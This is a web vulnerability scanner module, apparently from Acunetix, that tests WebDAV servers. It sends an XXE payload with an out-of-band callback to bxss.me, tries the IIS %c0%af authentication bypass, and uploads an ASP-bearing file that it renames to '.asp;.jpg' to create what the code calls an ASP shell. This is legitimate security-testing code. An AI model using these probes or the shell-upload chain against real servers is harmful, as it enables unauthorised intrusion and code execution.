// directories to be tested
var dirs = new Array();
var lastJob = null;
var allowedMethods = "";
// **************************************************************************************
function request(verb, uri, postData)
{
    lastJob = new THTTPJob();
    lastJob.verb = verb;
    lastJob.url  = scanURL;
    lastJob.uri  = uri;
    // try to authenticate with anonymous:anonymous
    lastJob.request.addHeader("Authorization", "Basic YW5vbnltb3VzOmFub255bW91cw==", true);
    if (postData)
        lastJob.request.body = postData;
    lastJob.autoAuthenticate = false;
    lastJob.execute();
    return (!lastJob.wasError);
}
// **************************************************************************************
function alertXXE(uri, payload, subdomain, reqData)
{
    var ri = new TReportItem();
    ri.LoadFromFile("XML_External_Entity_Injection_And_XML_Injection2.xml");
    ri.affects = uri;
    ri.alertPath = "Scripts/XML_External_Entity_Injection_And_XML_Injection2";
    ri.setHttpInfo(lastJob);
    ri.details =  "POST data was set to [bold][dark]" + payload + "[/dark][/bold][break]";
    if (subdomain) {
        ri.Details =  ri.Details + "[break]An HTTP request was initiated for the domain [bold]" + subdomain + ".bxss.me [/bold] which indicates that this script is vulnerable to XXE injection.";
        if (reqData) {
            ri.Details =  ri.Details + "[break][break]HTTP request details: [break][pre]" + reqData + "[/pre]";
        }
    }
    //trace(ri.Details);
    AddReportItem(ri);
}
// **************************************************************************************
function alertSSRF(uri, payload, subdomain, reqData)
{
    var ri = new TReportItem();
    ri.LoadFromFile("SSRF.xml");
    ri.affects = uri;
    ri.alertPath = "Scripts/SSRF";
    ri.setHttpInfo(lastJob);
    ri.details =  "POST data was set to [bold][dark]" + payload + "[/dark][/bold][break]";
    if (subdomain) {
        ri.Details =  ri.Details + "[break]An HTTP request was initiated for the domain [bold]" + subdomain + ".bxss.me [/bold] which indicates that this script is vulnerable to SSRF.";
        if (reqData) {
            ri.Details =  ri.Details + "[break][break]HTTP request details: [break][pre]" + reqData + "[/pre]";
        }
    }
    //trace(ri.Details);
    AddReportItem(ri);
}
// **************************************************************************************
function verifyInjection(rndToken) {
    var http 		= new THTTPJob();
    http.url 		= new TURL("http://bxss.s3.amazonaws.com/hits/" + rndToken);
    http.verb 		= "GET";
    http.timeout 	= 10000;
    http.retries 	= 0;
    http.execute();
    if (!http.wasError && http.response.body.startsWith("IP address:")){
        return http.response.body;
    }
    return false;
}
// **************************************************************************************
function testXXE(dir, method, postfix)
{
    var rndToken = 'hit' + randStr(10);
    var doctype = "dt" + randStr(5).toLowerCase();
    var contentType = "application/xml";
    var payload = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n";
    payload = payload + '<!DOCTYPE ' + doctype + ' [' + "\r\n";
    payload = payload + '  <!ENTITY % dtd SYSTEM "http://' + rndToken + '.bxss.me/">' + "\r\n";
    payload = payload + '%dtd;]>' + "\r\n";
    payload = payload + postfix;
    lastJob = new THTTPJob();
    lastJob.verb = method;
    lastJob.url  = scanUrl;
    lastJob.uri  = dir;
    lastJob.addCookies = false;
    lastJob.request.addHeader('Content-type', contentType, true);
    lastJob.request.addHeader('Depth', '0', true);
    lastJob.request.addHeader('Connection', 'TE', true);
    lastJob.request.addHeader('TE', 'trailers', true);
    // try to authenticate with anonymous:anonymous
    lastJob.request.addHeader("Authorization", "Basic YW5vbnltb3VzOmFub255bW91cw==", true);
    lastJob.request.body = payload;
    lastJob.execute();
    if (!lastJob.wasError) {
        // verify injection
        var reqData = verifyInjection(rndToken);
        if (reqData) {
            alertXXE(dir, payload, rndToken, reqData)
            return true;
        }
    }
    return false;
}
// **************************************************************************************
function alert(uri, vxml, job, matchedText)
{
    var ri = new TReportItem();
    ri.LoadFromFile(vxml);
    ri.affects = uri;
    ri.alertPath = "Scripts/WebDAV";
    if (matchedText) {
        ri.Details =  ri.Details + matchedText;
    }
    ri.setHttpInfo(job);
    AddReportItem(ri);
}
/***********************************************************************************/
function webDAVIsEnabled(){
    if (request("OPTIONS", "/") && lastJob)
    {
        allowedMethods = lastJob.response.headerValue('Allow');
        if ((lastJob.response.headerValue('MS-Author-Via').indexOf('DAV') != -1))
        {
            // don't issue this alert multiple times when there are many instances
            var webDavAlertIssued = GetGlobalValue('webDavAlertIssued');
            if (!webDavAlertIssued)
            {
                SetGlobalValue('webDavAlertIssued', 1, true);
                alert("Web Server", 'WebDAV_enabled.xml', lastJob);
            }
            return true;
        }
        if (allowedMethods.indexOf("PROPFIND") != -1 || allowedMethods.indexOf("PROPPATCH") != -1 || allowedMethods.indexOf("LOCK") != -1)
            return true;
    }
    return false;
}
/***********************************************************************************/
function testPROPFIND(dir){
    lastJob = new THTTPJob();
    lastJob.verb = "PROPFIND";
    lastJob.url  = scanURL;
    lastJob.uri  = dir;
    lastJob.request.addHeader("Content-Type", "text/xml", true);
    lastJob.request.addHeader("Depth", "1", true);
    lastJob.request.addHeader("Translate", "f", true);
    // try to authenticate with anonymous:anonymous
    lastJob.request.addHeader("Authorization", "Basic YW5vbnltb3VzOmFub255bW91cw==", true);
    lastJob.request.body = "<?xml version='1.0' encoding='UTF-8'?><d:propfind xmlns:d='DAV:'><d:prop><d:displayname/></d:prop></d:propfind>";
    lastJob.autoAuthenticate = false;
    lastJob.execute();
    if (!lastJob.wasError && !lastJob.notFound) {
        if (lastJob.responseStatus == 207){
            var re = /<a:href>(.*?)<\/a:href>/g;
            var urls = new Array();
            var match;
            while (match = re.exec(lastJob.response.body)) {
                urls.push(match[1]);
            }
            if (urls.length > 1){
                details = "The following URLs were found in this directory:[break][break][ul]";
                for (var i=0; i<urls.length; i++){
                    details = details + "[li]" + urls[i] + "[/li]";
                }
                details = details + "[/ul]";
                alert(dir, 'WebDAV_directory_listing.xml', lastJob, details);
                // if the %c0%af test was succesful, test also PUT on it
                if (dir.indexOf("%c0%af") != -1) {
                    alert(dir, 'IIS_Webdav_Auth_Bypass.xml', lastJob, details);
                    testPUT(dir);
                    // add directory to the site structure to be tested.
                    var root = getSiteRoot(0);
                    addLinkToCrawler(dir, root);
                }
            }
        }
        else
        // try to request the directory with %c0%af
        if (lastJob.responseStatus == 401){
            if (dir.indexOf("%c0%af") == -1) {
                // get the directory name without the lastslash
                var dirName = dir.substr(0, dir.length - 1) + "%c0%af/";
                testPROPFIND(dirName);
            }
        }
    }
}
/***********************************************************************************/
function RenameFile(oldFName, newFName){
    lastJob = new THTTPJob();
    lastJob.verb = "MOVE";
    lastJob.url  = scanURL;
    lastJob.uri  = oldFName;
    lastJob.request.addHeader("Destination", newFName, true);
    // try to authenticate with anonymous:anonymous
    lastJob.request.addHeader("Authorization", "Basic YW5vbnltb3VzOmFub255bW91cw==", true);
    lastJob.autoAuthenticate = false;
    lastJob.execute();
    if (!lastJob.wasError && !lastJob.notFound && lastJob.response.messageLine.search(/(201 Created|200 OK)/) != -1)
    {
        return true;
    }
    return false;
}
/***********************************************************************************/
function testPUT(dir){
    lastJob = new THTTPJob();
    lastJob.verb = "PUT";
    lastJob.url  = scanURL;
    var fname = dir + "acu_test_" + randStr(5) + ".jpg";
    lastJob.uri  = fname;
    lastJob.request.addHeader("Content-Type", "text/xml", true);
    // try to authenticate with anonymous:anonymous
    lastJob.request.addHeader("Authorization", "Basic YW5vbnltb3VzOmFub255bW91cw==", true);
    lastJob.request.body = "This is a test file created by Acunetix Web Vulnerability Scanner (http://www.acunetix.com). <% Response.Write(\"4d02070effdd7e319\" + \"ca561bc66617a8a\") %>";
    lastJob.autoAuthenticate = false;
    lastJob.execute();
    if (!lastJob.wasError && !lastJob.notFound && lastJob.response.messageLine.search(/(201 Created|200 OK)/) != -1)
    {
        // need to confirm the upload
        confirmJob = new THTTPJob();
        confirmJob.verb = "GET";
        confirmJob.url  = scanURL;
        confirmJob.uri  = fname;
        confirmJob.autoAuthenticate = false;
        confirmJob.execute();
        if (!confirmJob.wasError && !confirmJob.notFound && confirmJob.response.body.indexOf("This is a test file created by Acunetix Web Vulnerability Scanner") != -1)
        {
            details = 'In this directory the scanner was able to create a file named [dark][bold]' + fname + '[/bold][/dark].';
            alert(dir, 'WebDAV_Create_Files.xml', lastJob, details);
            // prepare the new name
            var up = new TURL(scanURL.url);
            up.path = dir + "acu_test_" + randStr(5) + ".asp;.jpg";
            var renamed = up.url;
            // try to rename the file
            if (RenameFile(fname, renamed)){
                // try to request the renamed file
                if (request("GET", renamed) && lastJob && lastJob.response.body.search('4d02070effdd7e319ca561bc66617a8a') != -1){
                    details = 'The ASP shell was created at [dark][bold]' + renamed + '[/bold][/dark].[break]The scanner will try to delete this file but it may not have enough permissions to do so.';
                    alert(dir, 'WebDAV_Shell.xml', lastJob, details);
                    // cleanup. try to delete the file
                    request("DELETE", renamed);
                }
            }
        }
    }
}
